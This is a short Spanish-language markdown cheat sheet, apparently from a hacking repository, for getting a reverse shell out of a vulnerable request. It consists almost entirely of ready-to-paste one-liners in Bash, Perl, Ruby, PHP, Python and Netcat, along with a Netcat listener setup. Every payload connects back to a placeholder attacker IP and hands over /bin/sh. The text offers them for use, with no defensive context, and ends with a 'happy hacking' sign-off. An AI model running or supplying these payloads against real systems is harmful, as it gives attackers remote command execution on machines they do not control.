# Reverse Shell

> Trucos para obtener un shell en una peticion vulnerable, se depende del lengueje que acepte las peticiones, requiere configurar previamente un puerto de escucha.

### Configuracion
* **Abre un puerto en tu maquina atacante con Netcat** - es el puerto que con el configuras el shell, estos ejemplos estan configurados con el 1234, puedes modificar el puerto
 
      nc -lvnp 1234
  
* **Modifica la IP en el shell por la de IP-attacker** [Configura el Host](https://github.com/heancako311299/githack)

### Bash

     bash -i >& /dev/tcp/IP-attacker/1234 0>&1
    
### Perl

     perl -e 'use Socket;$i="IP-attacker";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
   
### Ruby

     ruby -rsocket -e'f=TCPSocket.open("IP-attacker",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
    
### Php

     php -r '$sock=fsockopen("IP-attacker",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
    
### Python 2.7
    
     python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP-attacker",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    
### Netcat método -e

     nc -e /bin/sh IP-attacker 1234

### Netcat versiones antiguas

     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP-attacker 1234 >/tmp/f

h4Ppy #@cK1n6 :)
> Discord: heanczko#4478
